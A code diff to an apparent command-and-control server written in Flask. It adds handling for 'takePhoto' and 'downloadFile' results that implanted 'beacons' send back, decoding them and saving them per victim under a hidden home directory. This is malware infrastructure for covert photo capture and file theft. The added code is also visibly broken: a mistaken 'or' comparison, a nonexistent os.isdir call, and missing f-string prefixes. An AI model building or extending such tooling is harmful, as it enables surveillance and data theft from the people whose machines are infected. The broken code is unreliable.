@@ -2,6 +2,8 @@ from flask import Flask, request, jsonify, redirect, send_from_directory
 import uuid
 import time
 import logging
+import os
+import base64
 from flask_socketio import SocketIO
 from Modules.global_objects import (
     beacons, add_beacon_list, beacon_commands, config)
@@ -137,6 +139,13 @@ def response(path1, version):
                     print("Directory Traversal Responded, saved to file")
                     with open("directory_traversal.txt", "w") as f:
                         f.write(output)
+                elif beacon_commands["command"][i] == ("takePhoto" or "downloadFile"):
+                    print(f"Command {beacon_commands['beacon_uuid'][i]} ",
+                          "responded with: {output}") 
+                    if not os.isdir("~/.promeathanProxy/{beacon_commands['beacon_uuid'][i]}"):
+                        os.mkdir("~/.promeathanProxy/{beacon_commands['beacon_uuid'][i]}")
+                    with open(f"~/.promeathanProxy/{beacon_commands['beacon_uuid'][i]}/{beacon_commands['command_data'][i]}.jpg", "w") as f:
+                        f.write(base64.b64decode(output))
                 else:
                     print(
                         f"Command {beacon_commands['beacon_uuid'][i]} ",
